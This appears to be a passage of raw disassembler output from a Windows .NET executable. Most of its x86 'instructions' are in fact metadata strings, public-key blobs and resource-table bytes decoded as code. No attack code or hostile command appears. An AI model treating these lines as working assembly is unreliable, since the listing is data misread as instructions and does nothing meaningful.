  407547:	xor    al,0x30
  407549:	xor    BYTE PTR [eax],dh
  40754b:	xor    BYTE PTR [eax],dh
  40754d:	xor    BYTE PTR [eax],dh
  40754f:	xor    BYTE PTR ss:[edx],dh
  407552:	xor    BYTE PTR [eax],dh
  407554:	xor    BYTE PTR [eax],dh
  407556:	xor    BYTE PTR [eax],dh
  407558:	xor    dh,BYTE PTR [eax+esi*1]
  40755b:	xor    BYTE PTR [eax],dh
  40755d:	xor    BYTE PTR ds:0x34333532,dh
  407563:	xor    DWORD PTR [ebx],esi
  407565:	xor    DWORD PTR [eax],esi
  407567:	xor    BYTE PTR [eax],dh
  407569:	xor    al,0x30
  40756b:	xor    BYTE PTR [eax],dh
  40756d:	xor    BYTE PTR [eax],dh
  40756f:	xor    DWORD PTR [eax],esi
  407571:	xor    BYTE PTR [eax],dh
  407573:	xor    DWORD PTR [eax],esi
  407575:	xor    BYTE PTR [eax],dh
  407577:	aaa    
  407578:	xor    DWORD PTR fs:[esi+0x61],esp
  40757c:	xor    eax,0x61346337
  407581:	gs cmp DWORD PTR fs:[esi+0x30],esp
  407586:	popa   
  407587:	xor    esi,DWORD PTR [edx]
  407589:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40758d:	popa   
  40758e:	xor    BYTE PTR [esi+0x61],ah
  407591:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  407598:	cmp    BYTE PTR gs:[esi+0x64],ah
  40759c:	ss popa 
  40759e:	arpl   WORD PTR gs:[eax],di
  4075a1:	data16 cmp BYTE PTR [edi],dh
  4075a4:	bound  si,DWORD PTR [eax]
  4075a7:	xor    esi,DWORD PTR [edi]
  4075a9:	ss arpl WORD PTR ss:[eax],di
  4075ad:	xor    esi,DWORD PTR [ebx+eiz*2]
  4075b0:	cmp    DWORD PTR [ecx],edi
  4075b2:	cmp    DWORD PTR [edx],esi
  4075b4:	xor    DWORD PTR [ebp+0x62],esp
  4075b7:	xor    dh,BYTE PTR [ebx]
  4075b9:	bound  esp,QWORD PTR [ebp+0x37]
  4075bc:	cmp    DWORD PTR [ecx+0x64],esp
  4075bf:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4075c3:	arpl   WORD PTR [ebx+0x31],sp
  4075c6:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4075cb:	xor    dh,BYTE PTR [ebx]
  4075cd:	xor    DWORD PTR ss:[ebx],esi
  4075d0:	xor    dh,BYTE PTR [ecx]
  4075d2:	xor    BYTE PTR [edx],dh
  4075d4:	cmp    DWORD PTR [eax],esi
  4075d6:	xor    BYTE PTR [edx+0x37],ah
  4075d9:	xor    dh,BYTE PTR [ebx]
  4075db:	arpl   WORD PTR [esi+0x39],sp
  4075de:	cmp    BYTE PTR [eax],dh
  4075e0:	cmp    DWORD PTR ds:0x34636637,esi
  4075e6:	xor    DWORD PTR gs:[edi],esi
  4075e9:	aaa    
  4075ea:	xor    DWORD PTR [eax],esi
  4075ec:	cmp    BYTE PTR [esi+0x63],ah
  4075ef:	xor    BYTE PTR ss:[edi],dh
  4075f2:	aaa    
  4075f3:	aaa    
  4075f4:	xor    al,0x66
  4075f6:	xor    bh,BYTE PTR [ecx]
  4075f8:	cmp    BYTE PTR gs:[ebx],dh
  4075fb:	xor    dh,BYTE PTR [eax]
  4075fd:	cmp    DWORD PTR gs:[edx],esi
  407600:	gs popa 
  407602:	xor    BYTE PTR ds:0x34656365,dh
  407608:	cmp    BYTE PTR gs:[edx],dh
  40760b:	xor    DWORD PTR [ebx+0x30],esp
  40760e:	popa   
  40760f:	xor    eax,0x38656665
  407614:	xor    WORD PTR [esi],si
  407617:	xor    al,0x35
  407619:	arpl   WORD PTR [ebx+eiz*2],si
  40761c:	xor    BYTE PTR [ebx+0x39],ah
  40761f:	xor    esp,DWORD PTR [ebx+0x31]
  407622:	popa   
  407623:	bound  edi,QWORD PTR [ecx]
  407625:	cmp    DWORD PTR [edx],esi
  407627:	cmp    BYTE PTR ds:0x32323664,dh
  40762d:	arpl   WORD PTR [ecx+0x61],sp
  407630:	ss xor eax,0x64316332
  407636:	popaw  
  407638:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  40763e:	xor    eax,0x32663664
  407643:	fs gs xor eax,0x65373166
  40764a:	xor    eax,0x30666165
  40764f:	data16 arpl WORD PTR [ecx+edi*1],si
  407653:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  407658:	xor    DWORD PTR [ebx+0x38],esp
  40765b:	popa   
  40765c:	xor    DWORD PTR [edx],esi
  40765e:	xor    al,0x33
  407660:	ss xor eax,0x30323831
  407666:	ss arpl WORD PTR fs:[eax],si
  40766a:	cmp    DWORD PTR [ebx],esi
  40766c:	xor    esi,DWORD PTR [esp+esi*1]
  40766f:	fs xor eax,0x39326461
  407675:	xor    eax,DWORD PTR [eax]
  407677:	add    BYTE PTR [ecx-0x7efffe81],al
  40767d:	jns    0x4076cc
  40767f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  407686:	je     0x4076b6
  407688:	push   esp
  407689:	gs jae 0x407700
  40768c:	cs inc ecx
  40768e:	jo     0x4076f5
  407690:	js     0x4076c0
  407692:	push   esi
  407693:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40769a:	jne    0x407700
  40769c:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  4076a3:	ins    BYTE PTR es:[edi],dx
  4076a4:	ins    BYTE PTR es:[edi],dx
  4076a5:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x202c6563
  4076ad:	push   eax
  4076ae:	jne    0x407712
  4076b0:	ins    BYTE PTR es:[edi],dx
  4076b1:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4076b8:	xor    BYTE PTR [edx],dh
  4076ba:	xor    al,0x30
  4076bc:	xor    BYTE PTR [eax],dh
  4076be:	xor    BYTE PTR [eax],dh
  4076c0:	xor    al,0x38
  4076c2:	xor    BYTE PTR [eax],dh
  4076c4:	xor    BYTE PTR [eax],dh
  4076c6:	xor    BYTE PTR [ecx],bh
  4076c8:	xor    al,0x30
  4076ca:	xor    BYTE PTR [eax],dh
  4076cc:	xor    BYTE PTR [eax],dh
  4076ce:	xor    BYTE PTR [eax],dh
  4076d0:	xor    BYTE PTR ss:[edx],dh
  4076d3:	xor    BYTE PTR [eax],dh
  4076d5:	xor    BYTE PTR [eax],dh
  4076d7:	xor    BYTE PTR [eax],dh
  4076d9:	xor    dh,BYTE PTR [eax+esi*1]
  4076dc:	xor    BYTE PTR [eax],dh
  4076de:	xor    BYTE PTR ds:0x34333532,dh
  4076e4:	xor    DWORD PTR [ebx],esi
  4076e6:	xor    DWORD PTR [eax],esi
  4076e8:	xor    BYTE PTR [eax],dh
  4076ea:	xor    al,0x30
  4076ec:	xor    BYTE PTR [eax],dh
  4076ee:	xor    BYTE PTR [eax],dh
  4076f0:	xor    DWORD PTR [eax],esi
  4076f2:	xor    BYTE PTR [eax],dh
  4076f4:	xor    DWORD PTR [eax],esi
  4076f6:	xor    BYTE PTR [eax],dh
  4076f8:	aaa    
  4076f9:	xor    DWORD PTR fs:[esi+0x61],esp
  4076fd:	xor    eax,0x61346337
  407702:	gs cmp DWORD PTR fs:[esi+0x30],esp
  407707:	popa   
  407708:	xor    esi,DWORD PTR [edx]
  40770a:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40770e:	popa   
  40770f:	xor    BYTE PTR [esi+0x61],ah
  407712:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  407719:	cmp    BYTE PTR gs:[esi+0x64],ah
  40771d:	ss popa 
  40771f:	arpl   WORD PTR gs:[eax],di
  407722:	data16 cmp BYTE PTR [edi],dh
  407725:	bound  si,DWORD PTR [eax]
  407728:	xor    esi,DWORD PTR [edi]
  40772a:	ss arpl WORD PTR ss:[eax],di
  40772e:	xor    esi,DWORD PTR [ebx+eiz*2]
  407731:	cmp    DWORD PTR [ecx],edi
  407733:	cmp    DWORD PTR [edx],esi
  407735:	xor    DWORD PTR [ebp+0x62],esp
  407738:	xor    dh,BYTE PTR [ebx]
  40773a:	bound  esp,QWORD PTR [ebp+0x37]
  40773d:	cmp    DWORD PTR [ecx+0x64],esp
  407740:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  407744:	arpl   WORD PTR [ebx+0x31],sp
  407747:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40774c:	xor    dh,BYTE PTR [ebx]
  40774e:	xor    DWORD PTR ss:[ebx],esi
  407751:	xor    dh,BYTE PTR [ecx]
  407753:	xor    BYTE PTR [edx],dh
  407755:	cmp    DWORD PTR [eax],esi
  407757:	xor    BYTE PTR [edx+0x37],ah
  40775a:	xor    dh,BYTE PTR [ebx]
  40775c:	arpl   WORD PTR [esi+0x39],sp
  40775f:	cmp    BYTE PTR [eax],dh
  407761:	cmp    DWORD PTR ds:0x34636637,esi
  407767:	xor    DWORD PTR gs:[edi],esi
  40776a:	aaa    
  40776b:	xor    DWORD PTR [eax],esi
  40776d:	cmp    BYTE PTR [esi+0x63],ah
  407770:	xor    BYTE PTR ss:[edi],dh
  407773:	aaa    
  407774:	aaa    
  407775:	xor    al,0x66
  407777:	xor    bh,BYTE PTR [ecx]
  407779:	cmp    BYTE PTR gs:[ebx],dh
  40777c:	xor    dh,BYTE PTR [eax]
  40777e:	cmp    DWORD PTR gs:[edx],esi
  407781:	gs popa 
  407783:	xor    BYTE PTR ds:0x34656365,dh
  407789:	cmp    BYTE PTR gs:[edx],dh
  40778c:	xor    DWORD PTR [ebx+0x30],esp
  40778f:	popa   
  407790:	xor    eax,0x38656665
  407795:	xor    WORD PTR [esi],si
  407798:	xor    al,0x35
  40779a:	arpl   WORD PTR [ebx+eiz*2],si
  40779d:	xor    BYTE PTR [ebx+0x39],ah
  4077a0:	xor    esp,DWORD PTR [ebx+0x31]
  4077a3:	popa   
  4077a4:	bound  edi,QWORD PTR [ecx]
  4077a6:	cmp    DWORD PTR [edx],esi
  4077a8:	cmp    BYTE PTR ds:0x32323664,dh
  4077ae:	arpl   WORD PTR [ecx+0x61],sp
  4077b1:	ss xor eax,0x64316332
  4077b7:	popaw  
  4077b9:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4077bf:	xor    eax,0x32663664
  4077c4:	fs gs xor eax,0x65373166
  4077cb:	xor    eax,0x30666165
  4077d0:	data16 arpl WORD PTR [ecx+edi*1],si
  4077d4:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4077d9:	xor    DWORD PTR [ebx+0x38],esp
  4077dc:	popa   
  4077dd:	xor    DWORD PTR [edx],esi
  4077df:	xor    al,0x33
  4077e1:	ss xor eax,0x30323831
  4077e7:	ss arpl WORD PTR fs:[eax],si
  4077eb:	cmp    DWORD PTR [ebx],esi
  4077ed:	xor    esi,DWORD PTR [esp+esi*1]
  4077f0:	fs xor eax,0x39326461
  4077f6:	xor    eax,DWORD PTR [eax]
  4077f8:	add    BYTE PTR [ecx-0x7efffe80],al
  4077fe:	jp     0x40784d
  407800:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  407807:	je     0x407837
  407809:	push   esi
  40780a:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  407811:	jne    0x407877
  407813:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  40781a:	ins    BYTE PTR es:[edi],dx
  40781b:	ins    BYTE PTR es:[edi],dx
  40781c:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x502e6563
  407824:	outs   dx,DWORD PTR ds:[esi]
  407825:	ja     0x40788c
  407827:	jb     0x40787c
  407829:	push   0x2c6c6c65
  40782e:	and    BYTE PTR [eax+0x75],dl
  407831:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  407835:	dec    ebx
  407836:	gs jns 0x407876
  407839:	xor    BYTE PTR [eax],dh
  40783b:	xor    dh,BYTE PTR [eax+esi*1]
  40783e:	xor    BYTE PTR [eax],dh
  407840:	xor    BYTE PTR [eax],dh
  407842:	xor    al,0x38
  407844:	xor    BYTE PTR [eax],dh
  407846:	xor    BYTE PTR [eax],dh
  407848:	xor    BYTE PTR [ecx],bh
  40784a:	xor    al,0x30
  40784c:	xor    BYTE PTR [eax],dh
  40784e:	xor    BYTE PTR [eax],dh
  407850:	xor    BYTE PTR [eax],dh
  407852:	xor    BYTE PTR ss:[edx],dh
  407855:	xor    BYTE PTR [eax],dh
  407857:	xor    BYTE PTR [eax],dh
  407859:	xor    BYTE PTR [eax],dh
  40785b:	xor    dh,BYTE PTR [eax+esi*1]
  40785e:	xor    BYTE PTR [eax],dh
  407860:	xor    BYTE PTR ds:0x34333532,dh
  407866:	xor    DWORD PTR [ebx],esi
  407868:	xor    DWORD PTR [eax],esi
  40786a:	xor    BYTE PTR [eax],dh
  40786c:	xor    al,0x30
  40786e:	xor    BYTE PTR [eax],dh
  407870:	xor    BYTE PTR [eax],dh
  407872:	xor    DWORD PTR [eax],esi
  407874:	xor    BYTE PTR [eax],dh
  407876:	xor    DWORD PTR [eax],esi
  407878:	xor    BYTE PTR [eax],dh
  40787a:	aaa    
  40787b:	xor    DWORD PTR fs:[esi+0x61],esp
  40787f:	xor    eax,0x61346337
  407884:	gs cmp DWORD PTR fs:[esi+0x30],esp
  407889:	popa   
  40788a:	xor    esi,DWORD PTR [edx]
  40788c:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  407890:	popa   
  407891:	xor    BYTE PTR [esi+0x61],ah
  407894:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40789b:	cmp    BYTE PTR gs:[esi+0x64],ah
  40789f:	ss popa 
  4078a1:	arpl   WORD PTR gs:[eax],di
  4078a4:	data16 cmp BYTE PTR [edi],dh
  4078a7:	bound  si,DWORD PTR [eax]
  4078aa:	xor    esi,DWORD PTR [edi]
  4078ac:	ss arpl WORD PTR ss:[eax],di
  4078b0:	xor    esi,DWORD PTR [ebx+eiz*2]
  4078b3:	cmp    DWORD PTR [ecx],edi
  4078b5:	cmp    DWORD PTR [edx],esi
  4078b7:	xor    DWORD PTR [ebp+0x62],esp
  4078ba:	xor    dh,BYTE PTR [ebx]
  4078bc:	bound  esp,QWORD PTR [ebp+0x37]
  4078bf:	cmp    DWORD PTR [ecx+0x64],esp
  4078c2:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4078c6:	arpl   WORD PTR [ebx+0x31],sp
  4078c9:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4078ce:	xor    dh,BYTE PTR [ebx]
  4078d0:	xor    DWORD PTR ss:[ebx],esi
  4078d3:	xor    dh,BYTE PTR [ecx]
  4078d5:	xor    BYTE PTR [edx],dh
  4078d7:	cmp    DWORD PTR [eax],esi
  4078d9:	xor    BYTE PTR [edx+0x37],ah
  4078dc:	xor    dh,BYTE PTR [ebx]
  4078de:	arpl   WORD PTR [esi+0x39],sp
  4078e1:	cmp    BYTE PTR [eax],dh
  4078e3:	cmp    DWORD PTR ds:0x34636637,esi
  4078e9:	xor    DWORD PTR gs:[edi],esi
  4078ec:	aaa    
  4078ed:	xor    DWORD PTR [eax],esi
  4078ef:	cmp    BYTE PTR [esi+0x63],ah
  4078f2:	xor    BYTE PTR ss:[edi],dh
  4078f5:	aaa    
  4078f6:	aaa    
  4078f7:	xor    al,0x66
  4078f9:	xor    bh,BYTE PTR [ecx]
  4078fb:	cmp    BYTE PTR gs:[ebx],dh
  4078fe:	xor    dh,BYTE PTR [eax]
  407900:	cmp    DWORD PTR gs:[edx],esi
  407903:	gs popa 
  407905:	xor    BYTE PTR ds:0x34656365,dh
  40790b:	cmp    BYTE PTR gs:[edx],dh
  40790e:	xor    DWORD PTR [ebx+0x30],esp
  407911:	popa   
  407912:	xor    eax,0x38656665
  407917:	xor    WORD PTR [esi],si
  40791a:	xor    al,0x35
  40791c:	arpl   WORD PTR [ebx+eiz*2],si
  40791f:	xor    BYTE PTR [ebx+0x39],ah
  407922:	xor    esp,DWORD PTR [ebx+0x31]
  407925:	popa   
  407926:	bound  edi,QWORD PTR [ecx]
  407928:	cmp    DWORD PTR [edx],esi
  40792a:	cmp    BYTE PTR ds:0x32323664,dh
  407930:	arpl   WORD PTR [ecx+0x61],sp
  407933:	ss xor eax,0x64316332
  407939:	popaw  
  40793b:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  407941:	xor    eax,0x32663664
  407946:	fs gs xor eax,0x65373166
  40794d:	xor    eax,0x30666165
  407952:	data16 arpl WORD PTR [ecx+edi*1],si
  407956:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40795b:	xor    DWORD PTR [ebx+0x38],esp
  40795e:	popa   
  40795f:	xor    DWORD PTR [edx],esi
  407961:	xor    al,0x33
  407963:	ss xor eax,0x30323831
  407969:	ss arpl WORD PTR fs:[eax],si
  40796d:	cmp    DWORD PTR [ebx],esi
  40796f:	xor    esi,DWORD PTR [esp+esi*1]
  407972:	fs xor eax,0x39326461
  407978:	xor    eax,DWORD PTR [eax]
  40797a:	add    BYTE PTR [eax],cl
  40797c:	add    DWORD PTR [eax],eax
  40797e:	or     BYTE PTR [eax],al
  407980:	add    BYTE PTR [eax],al
  407982:	add    BYTE PTR [eax],al
  407984:	sbb    BYTE PTR [esi-0x7b7ffed2],0x53
  40798b:	jns    0x407a00
  40798d:	je     0x4079f4
  40798f:	ins    DWORD PTR es:[edi],dx
  407990:	cs push ebx
  407992:	arpl   WORD PTR gs:[ebp+0x72],si
  407996:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  40799e:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  4079a5:	cs push ebx
  4079a7:	arpl   WORD PTR gs:[ebp+0x72],si
  4079ab:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  4079b3:	jae    0x407a28
  4079b5:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4079bc:	imul   esp,DWORD PTR [edx+0x75],0x202c6574
  4079c3:	ins    DWORD PTR es:[edi],dx
  4079c4:	jae    0x407a29
  4079c6:	outs   dx,DWORD PTR ds:[esi]
  4079c7:	jb     0x407a35
  4079c9:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4079d0:	jae    0x407a3b
  4079d2:	outs   dx,DWORD PTR ds:[esi]
  4079d3:	outs   dx,BYTE PTR ds:[esi]
  4079d4:	cmp    eax,0x2e302e32
  4079d9:	xor    BYTE PTR [esi],ch
  4079db:	xor    BYTE PTR [eax+eiz*1],ch
  4079de:	inc    ebx
  4079df:	jne    0x407a4d
  4079e1:	je     0x407a58
  4079e3:	jb     0x407a4a
  4079e5:	cmp    eax,0x7475656e
  4079ea:	jb     0x407a4d
  4079ec:	ins    BYTE PTR es:[edi],dx
  4079ed:	sub    al,0x20
  4079ef:	push   eax
  4079f0:	jne    0x407a54
  4079f2:	ins    BYTE PTR es:[edi],dx
  4079f3:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4079fa:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4079fe:	bound  esi,QWORD PTR [edi]
  407a00:	aaa    
  407a01:	popa   
  407a02:	xor    eax,0x31363563
  407a07:	cmp    DWORD PTR [ebx],esi
  407a09:	xor    al,0x65
  407a0b:	xor    BYTE PTR [eax],bh
  407a0d:	cmp    DWORD PTR ds:0x10025401,edx
  407a13:	push   ebx
  407a14:	imul   ebp,DWORD PTR [ecx+0x70],0x56
  407a18:	gs jb  0x407a84
  407a1b:	imul   sp,WORD PTR [ebx+0x61],0x6974
  407a21:	outs   dx,DWORD PTR ds:[esi]
  407a22:	outs   dx,BYTE PTR ds:[esi]
  407a23:	add    DWORD PTR [eax],eax
  407a25:	add    BYTE PTR [eax],al
  407a27:	add    al,al
  407a29:	ficom  DWORD PTR [ecx]
  407a2b:	push   eax
  407a2c:	add    BYTE PTR [eax],al
  407a2e:	add    BYTE PTR [eax],al
  407a30:	add    al,BYTE PTR [eax]
  407a32:	add    BYTE PTR [eax],al
  407a34:	sub    DWORD PTR [eax],eax
  407a36:	add    BYTE PTR [eax],al
  407a38:	inc    eax
  407a39:	jp     0x407a3b
  407a3b:	add    BYTE PTR [eax+0x5c],al
  407a3e:	add    BYTE PTR [eax],al
  407a40:	push   edx
  407a41:	push   ebx
  407a42:	inc    esp
  407a43:	push   ebx
  407a44:	cmp    eax,0x7a2c6d32
  407a49:	xor    eax,0x10824220
  407a4e:	add    dl,BYTE PTR [edx+ebp*4-0x69]
  407a52:	sar    DWORD PTR [ebx+0x1],1
  407a55:	add    BYTE PTR [eax],al
  407a57:	add    BYTE PTR [ecx+0x6e],cl
  407a5a:	je     0x407ac1
  407a5c:	ins    BYTE PTR es:[edi],dx
  407a5d:	ins    BYTE PTR es:[edi],dx
  407a5e:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x702e6563
  407a66:	bound  eax,QWORD PTR fs:[eax]
	...
  407b59:	add    BYTE PTR [eax],al
  407b5b:	add    BYTE PTR [ebx+edi*2+0x0],al
  407b62:	add    BYTE PTR [eax],al
  407b64:	add    BYTE PTR [eax],al
  407b66:	add    BYTE PTR [eax],al
  407b68:	sahf   
  407b69:	jnp    0x407b6b
  407b6b:	add    BYTE PTR [eax],al
  407b6d:	and    BYTE PTR [eax],al
	...
  407b83:	add    BYTE PTR [eax+0x7b],dl
	...
  407b91:	add    BYTE PTR [edi+0x43],bl
  407b94:	outs   dx,DWORD PTR ds:[esi]
  407b95:	jb     0x407bdc
  407b97:	js     0x407bfe
  407b99:	dec    ebp
  407b9a:	popa   
  407b9b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  407ba2:	jb     0x407c09
  407ba4:	gs cs fs ins BYTE PTR es:[edi],dx
  407ba8:	ins    BYTE PTR es:[edi],dx
  407ba9:	add    BYTE PTR [eax],al
  407bab:	add    BYTE PTR [eax],al
  407bad:	add    bh,bh
  407baf:	and    eax,0x402000

Disassembly of section .rsrc:

00408000 <.rsrc>:
	...
  408008:	add    al,0x0
  40800a:	add    BYTE PTR [eax],al
  40800c:	add    DWORD PTR [eax],eax
  40800e:	add    al,BYTE PTR [eax]
  408010:	call   0x28c08015
  408015:	add    BYTE PTR [eax],al
  408017:	adc    BYTE PTR [eax],0x0
  40801a:	add    BYTE PTR [eax],al
  40801c:	inc    eax
  40801d:	add    BYTE PTR [eax],al
  40801f:	sbb    BYTE PTR [eax],0x0
  408022:	add    BYTE PTR [eax],al
  408024:	pop    eax
  408025:	add    BYTE PTR [eax],al
  408027:	add    BYTE PTR [eax],0x0
  40802a:	add    BYTE PTR [eax],al
  40802c:	add    BYTE PTR [eax],al
  40802e:	add    BYTE PTR [eax],al
  408030:	add    al,0x0
  408032:	add    BYTE PTR [eax],al
  408034:	add    DWORD PTR [eax],eax
  408036:	add    BYTE PTR [eax],al
  408038:	lock add BYTE PTR [eax],al
  40803b:	xor    BYTE PTR [eax+0x0],0x0
  40803f:	add    BYTE PTR [eax],0x0
  408042:	add    BYTE PTR [eax],al
  408044:	add    BYTE PTR [eax],al
  408046:	add    BYTE PTR [eax],al
  408048:	add    al,0x0
  40804a:	add    BYTE PTR [eax],al
  40804c:	add    BYTE PTR [eax],al
  40804e:	add    DWORD PTR [eax],eax
  408050:	add    DWORD PTR [eax],eax
  408052:	add    BYTE PTR [eax],al
  408054:	mov    BYTE PTR [eax],al
  408056:	add    BYTE PTR [eax+0x0],al
  40805c:	add    BYTE PTR [eax],al
  40805e:	add    BYTE PTR [eax],al
  408060:	add    al,0x0
  408062:	add    BYTE PTR [eax],al
  408064:	add    BYTE PTR [eax],al
  408066:	add    DWORD PTR [eax],eax
  408068:	add    DWORD PTR [eax],eax
  40806a:	add    BYTE PTR [eax],al
  40806c:	mov    al,ds:0x800000
  408071:	add    BYTE PTR [eax],al
  408073:	add    BYTE PTR [eax],al
  408075:	add    BYTE PTR [eax],al
  408077:	add    BYTE PTR [eax+eax*1],al
  40807a:	add    BYTE PTR [eax],al
  40807c:	add    BYTE PTR [eax],al
  40807e:	add    DWORD PTR [eax],eax
  408080:	add    BYTE PTR [eax],al
  408082:	add    BYTE PTR [eax],al
  408084:	mov    eax,0x0
  408089:	add    BYTE PTR [eax],al
  40808b:	add    BYTE PTR [eax],al
  40808d:	add    BYTE PTR [eax],al
  40808f:	add    BYTE PTR [eax+eax*1],al
  408092:	add    BYTE PTR [eax],al
  408094:	add    BYTE PTR [eax],al
  408096:	add    DWORD PTR [eax],eax
  408098:	add    BYTE PTR [eax],al
  40809a:	add    BYTE PTR [eax],al
  40809c:	enter  0x0,0x0
	...
  4080a8:	add    al,0x0
  4080aa:	add    BYTE PTR [eax],al
  4080ac:	add    BYTE PTR [eax],al
  4080ae:	add    DWORD PTR [eax],eax
  4080b0:	add    BYTE PTR [eax],al
  4080b2:	add    BYTE PTR [eax],al
  4080b4:	fadd   DWORD PTR [eax]
  4080b6:	add    BYTE PTR [eax],al
  4080b8:	or     al,0x81
  4080ba:	add    BYTE PTR [eax],al
  4080bc:	push   ss
  4080bd:	add    eax,DWORD PTR [eax]
  4080bf:	add    ah,ah
  4080c1:	add    al,0x0
  4080c3:	add    BYTE PTR [eax],al
  4080c5:	add    BYTE PTR [eax],al
  4080c7:	add    BYTE PTR [esp+eax*4],ah
  4080ca:	add    BYTE PTR [eax],al
  4080cc:	rol    BYTE PTR [ebx],1
  4080ce:	add    BYTE PTR [eax],al
  4080d0:	in     al,0x4
  4080d2:	add    BYTE PTR [eax],al
  4080d4:	add    BYTE PTR [eax],al
  4080d6:	add    BYTE PTR [eax],al
  4080d8:	hlt    
  4080d9:	xchg   DWORD PTR [eax],eax
  4080db:	add    dl,ch
  4080dd:	add    DWORD PTR [eax],eax
  4080df:	add    ah,ah
  4080e1:	add    al,0x0
  4080e3:	add    BYTE PTR [eax],al
  4080e5:	add    BYTE PTR [eax],al
  4080e7:	add    BYTE PTR [ebx],al
  4080e9:	add    BYTE PTR [ecx+0x0],cl
  4080ec:	inc    edx
  4080ed:	add    BYTE PTR [ebx+0x0],al
  4080f0:	or     al,0x0
  4080f2:	push   eax
  4080f3:	add    BYTE PTR [edx+0x0],dl
  4080f6:	dec    edi
  4080f7:	add    BYTE PTR [esi+0x0],al
  4080fa:	dec    ecx
  4080fb:	add    BYTE PTR [eax+eax*1+0x45],cl
  4080ff:	add    BYTE PTR [edi+0x0],bl
  408102:	inc    esp
  408103:	add    BYTE PTR [ecx+0x0],al
  408106:	push   esp
  408107:	add    BYTE PTR [ecx+0x0],al
  40810a:	add    BYTE PTR [eax],al
  40810c:	sub    BYTE PTR [eax],al
  40810e:	add    BYTE PTR [eax],al
  408110:	push   ds
  408111:	icebp  
  408112:	shl    BYTE PTR [ecx+0x3],1
  408118:	rol    BYTE PTR [eax+0x4],0x1f
  40811c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40811d:	imul   esp,DWORD PTR [edi],0xfbad8442
  408123:	ss ss pop ebp
  408126:	sbb    BYTE PTR [edi+0xc],0x0
  40812d:	add    BYTE PTR [eax],al
  40812f:	add    BYTE PTR [ecx],al
  408131:	add    BYTE PTR [eax],al
  408133:	add    BYTE PTR [edi],cl
  408135:	add    BYTE PTR [eax],al
  408137:	add    BYTE PTR [ecx],al
  408139:	add    BYTE PTR [eax],al
  40813b:	add    al,ah
  40813d:	add    BYTE PTR [eax],al
  40813f:	add    BYTE PTR [edx],ch
  408141:	add    BYTE PTR [eax],al
  408143:	add    BYTE PTR [ebx],al
  408145:	add    BYTE PTR [eax],al
  408147:	add    BYTE PTR [edx],cl
  408149:	add    DWORD PTR [eax],eax
  40814b:	add    BYTE PTR [edx],cl
  40814d:	add    BYTE PTR [eax],al
  40814f:	add    BYTE PTR [eax+eax*1],al
  408152:	add    BYTE PTR [eax],al
  408154:	adc    al,0x1
  408156:	add    BYTE PTR [eax],al
  408158:	sub    al,0x0
  40815a:	add    BYTE PTR [eax],al
  40815c:	add    eax,0x40000000
  408161:	add    DWORD PTR [eax],eax
  408163:	add    BYTE PTR [edx],bl
  408165:	add    BYTE PTR [eax],al
  408167:	add    BYTE PTR [ecx],cl
  408169:	add    BYTE PTR [eax],al
  40816b:	add    BYTE PTR [edx+0x1],bl
  40816e:	add    BYTE PTR [eax],al
  408170:	adc    al,BYTE PTR [eax]
  408172:	add    BYTE PTR [eax],al
  408174:	or     eax,DWORD PTR [eax]
  408176:	add    BYTE PTR [eax],al
  408178:	ins    BYTE PTR es:[edi],dx
  408179:	add    DWORD PTR [eax],eax
  40817b:	add    BYTE PTR [esi],al
  40817d:	add    BYTE PTR [eax],al
  40817f:	add    BYTE PTR ds:0x72000000,cl
  408185:	add    DWORD PTR [eax],eax
  408187:	add    BYTE PTR [eax+eax*1],ch
  40818a:	add    BYTE PTR [eax],al
  40818c:	sldt   WORD PTR [eax]
  40818f:	add    BYTE PTR [esi-0x79ffffff],bl
  408195:	add    BYTE PTR [eax],al
  408197:	add    BYTE PTR [ebx],ah
  408199:	add    BYTE PTR [eax],al
  40819b:	add    BYTE PTR [edx+eax*1],ah
  40819e:	add    BYTE PTR [eax],al
  4081a0:	push   es
  4081a1:	add    BYTE PTR [eax],al
  4081a3:	add    BYTE PTR [esi],ah
  4081a5:	add    BYTE PTR [eax],al
  4081a7:	add    BYTE PTR [edx],ch
  4081a9:	add    al,BYTE PTR [eax]
  4081ab:	add    BYTE PTR [edx],cl
  4081ad:	add    BYTE PTR [eax],al
  4081af:	add    BYTE PTR [eax],dh
  4081b1:	add    BYTE PTR [eax],al
  4081b3:	add    BYTE PTR [edx+eax*1],dh
  4081b6:	add    BYTE PTR [eax],al
  4081b8:	adc    eax,0x31000000
  4081bd:	add    BYTE PTR [eax],al
